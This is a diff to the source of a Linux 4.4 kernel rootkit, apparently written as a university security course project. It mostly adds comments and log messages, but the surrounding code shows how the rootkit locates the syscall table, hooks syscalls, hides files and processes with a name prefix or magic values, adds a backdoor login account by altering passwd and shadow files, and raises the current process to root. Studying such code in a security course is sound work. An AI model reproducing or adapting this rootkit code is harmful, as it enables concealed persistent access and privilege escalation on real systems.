@@ -1,3 +1,13 @@
+/*
+ *    Linux 4.4 Kernel rootkit
+ *    Done as a part of CSE 509 Computer System Security
+ *    Authors:
+ *        Shivanshu Goswami    110 898 793
+ *        Shikhar Sharma       110 739 968
+ *        Mukul Sharma         110 900 654
+ *        Pushkar Garg         110 763 734
+ */
+
 #include <asm/page.h>
 #include <linux/slab.h>
 #include <linux/init.h>
@@ -13,12 +23,12 @@
 #include <asm/processor-flags.h>
 
 #if defined(__x86_64__)
-#define SYSCALL_TABLE_START 0xffffffff81000000l
+#define SYSCALL_TABLE_START 0xffffffff81000000l    /* For 64 bit systems */
 #define SYSCALL_TABLE_STOP  0xffffffffa2000000l
 unsigned long **syscall_table;
 typedef unsigned long pointer_size_t;
 #else
-#define SYSCALL_TABLE_START  0xc0000000
+#define SYSCALL_TABLE_START  0xc0000000            /* For 32 bit systems */
 #define SYSCALL_TABLE_STOP   0xd0000000
 unsigned int **syscall_table;
 typedef unsigned int pointer_size_t;
@@ -27,7 +37,7 @@ typedef unsigned int pointer_size_t;
 #define BUFSIZE 32768
 #define HIDE_PREFIX "cse509--"
 
-#define RKIT_VERBOSE 1
+#define RKIT_VERBOSE 1 /* Set this to 1 to see the logs in dmesg */
 #define PUBMSG(fmt, ...) do {\
     if (RKIT_VERBOSE == 1)\
         printk(KERN_ERR "RKIT: %s\n", fmt, ##__VA_ARGS__);\
@@ -53,14 +63,14 @@ struct buffer_struct {
 struct buffer_struct buf_struct;
 struct hidden_pids_struct hidden_pids;
 
-pid_t proc_open_pid; /* pid of the process that has currently opened '/proc/' */
-int proc_open_fd;    /* fd for opened '/proc/' in this process open_files table */
-u_int8_t module_hidden;
-u_int8_t hide_files_flag;
-u_int8_t backdoor_added;
-u_int8_t backdoor_needs_refresh;
+pid_t proc_open_pid;                 /* pid of the process that has currently opened '/proc/' */
+int proc_open_fd;                    /* fd for opened '/proc/' in this process open_files table */
+u_int8_t module_hidden;              /* flag to check if the module is currently hidden */
+u_int8_t backdoor_added;             /* flag to check if a backdoor for logging in is currently added */
+u_int8_t hide_files_flag;            /* flag which tells the system to not show certain files when set */
+u_int8_t backdoor_needs_refresh;     /* passwd and shadow files have been altered, refresh malicious files */
 
-/***************************************************************************/
+/****************************************************************************/
 /* SPECIAL VALUES FOR MALICIOUS COMMUNICATION BETWEEN PROCESSES AND ROOTKIT */
 #define HIDE_FILES      -7111963
 #define SHOW_FILES      -294365563
@@ -71,7 +81,7 @@ u_int8_t backdoor_needs_refresh;
 #define SHOW_PROCESS    -2051967
 #define ADD_BACKDOOR    -31337
 #define REMOVE_BACKDOOR -841841
-/***************************************************************************/
+/****************************************************************************/
 
 /* To store a pointer to original syscalls */
 asmlinkage int (*original_close)(int fd);
@@ -124,7 +134,7 @@ int add_backdoor(void)
         return ret;
     }
     backdoor_added = 1;
-
+    PUBMSG("Adding backdoor for logging in");
     return ret;
 }
 
@@ -154,6 +164,7 @@ int remove_backdoor(void)
             PUBMSG("Failed to remove original muzershadow");
         }
     }
+    PUBMSG("Removed the backdoor");
     return ret;
 }
 
@@ -306,6 +317,7 @@ out:
     return ret;
 }
 
+/* Unlinks the struct file* passed to it */
 int deletes_file(struct file* filp)
 {
     int ret = 0;
@@ -321,6 +333,7 @@ int deletes_file(struct file* filp)
     return ret;
 }
 
+/* Hide files and folders with name starting with cse509--  */
 int hide_files(void)
 {
     int err = 0;
@@ -328,14 +341,16 @@ int hide_files(void)
         hide_files_flag = 1;
         err = 1;
     }
+    PUBMSG("Hiding files with cse509-- extension");
     return err;
 }
 
+/* Unhide files and folders with name starting with cse509--  */
 int show_files(void)
 {
     int err = 0;
     /*
-     * Showing files will be useful for demo
+    // Showing files will be useful for demo
     if (backdoor_added) {
         PUBMSG("Backdoor account has been added. Cannot show files presently.");
         err = -EPERM;
@@ -346,6 +361,7 @@ int show_files(void)
         hide_files_flag = 0;
         err = 1;
     }
+    PUBMSG("Showing the hidden files...");
     return err;
 }
 
@@ -395,7 +411,7 @@ int elevate_current_privileges(void)
         commit_creds(elevated_cred);
         err = 0;
     }
-
+    PUBMSG("Elevating privilages for the current process...");
     return err;
 }
 
@@ -419,6 +435,7 @@ int show_current_process(void)
 {
     struct hidden_pids_struct *iter, *tmp;
     pid_t pid = current->pid;
+    PUBMSG("Unhiding the current process");
     list_for_each_entry_safe(iter, tmp, &hidden_pids.list, list) {
         if (iter->pid == pid) {
             list_del(&iter->list);
@@ -446,9 +463,9 @@ int hide_current_process(void)
     node->pid = pid;
     list_add_tail(&node->list, &hidden_pids.list);
 out:
+    PUBMSG("Hiding the current process");
     return err;
 }
-
 
 char *get_str_in_kernelspace(const char __user *ustr, char *kstr, int max)
 {
@@ -676,7 +693,6 @@ asmlinkage int my_close(int fd)
         if (proc_open_fd == fd && proc_open_pid == current->pid) {
             /* closed "/proc";
                clear stored fd and pid */
-
             proc_open_fd = -1;
             proc_open_pid = -1;
         }
